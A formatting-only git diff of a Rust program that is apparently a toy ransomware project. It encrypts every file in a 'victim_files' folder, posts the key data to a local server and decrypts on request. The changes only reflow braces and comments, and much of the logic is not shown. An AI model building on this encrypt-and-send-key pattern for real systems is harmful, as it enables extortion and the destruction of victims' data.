@@ -9,8 +9,6 @@ mod networking;
 
 const BASE_URL: &str = "http://localhost:8000";
 
-
-
 fn encrypt_files() {
 	let uuid = uuid::Uuid::new_v4().to_string();
 	let key = chacha20::gen_key();
@@ -18,7 +16,8 @@ fn encrypt_files() {
 
 	for file in files::list_files("victim_files").unwrap() {
 		let ext = file.extension().unwrap();
-		if ext != std::ffi::OsStr::new("encrypted") { // Skip file if it's already encrypted
+		if ext != std::ffi::OsStr::new("encrypted") {
+			// Skip file if it's already encrypted
 			let filename = file.to_str().unwrap();
 			let newfilename = format!("{}.encrypted", filename);
 
@@ -40,7 +39,6 @@ fn encrypt_files() {
 	networking::post(&url, &json);
 }
 
-
 fn decrypt_files() {
 	let nonce = chacha20::Nonce::from_slice(b"verygood").unwrap();
 
@@ -56,7 +54,8 @@ fn decrypt_files() {
 	for file in files::list_files("victim_files").unwrap() {
 		let ext = file.extension().unwrap();
 		// TODO: delete old files
-		if ext == std::ffi::OsStr::new("encrypted") { // Only try to decrypt encrypted files
+		if ext == std::ffi::OsStr::new("encrypted") {
+			// Only try to decrypt encrypted files
 			let filename = file.to_str().unwrap();
 			let newfilename = filename.replace(".encrypted", ""); // If a file already has ".encrypted" in its name we're fucked, but that won't happen anyway, right?
 
@@ -69,14 +68,15 @@ fn decrypt_files() {
 	}
 }
 
-
 fn main() {
 	let args: Vec<String> = std::env::args().collect();
 	if args.len() > 1 {
-		if args[1] == "decrypt" { decrypt_files(); }
-		else { encrypt_files(); }
-	}
-	else {
+		if args[1] == "decrypt" {
+			decrypt_files();
+		} else {
+			encrypt_files();
+		}
+	} else {
 		encrypt_files();
 	}
 }
